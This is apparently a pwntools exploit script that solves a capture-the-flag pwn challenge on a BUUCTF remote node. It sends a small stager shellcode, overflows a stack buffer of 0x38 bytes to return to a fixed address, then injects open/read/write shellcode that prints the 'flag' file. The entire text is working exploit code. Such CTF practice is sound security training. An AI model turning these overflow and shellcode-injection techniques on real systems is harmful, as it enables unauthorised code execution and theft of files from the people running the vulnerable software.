from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29841)
elf = ELF('./pwn')
payload = asm(shellcraft.read(0, '0x233014', 0x42)) # len(payload) = 14
io.sendlineafter(b'Well.Just a little.\n', payload)
payload = b'a'*(0x30+0x8) + p64(0x233000)
io.sendlineafter(b"Let's see what u can do this time~\n", payload)
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)
payload = asm(shellcode)
io.sendlineafter('See you!\n', payload)
io.interactive()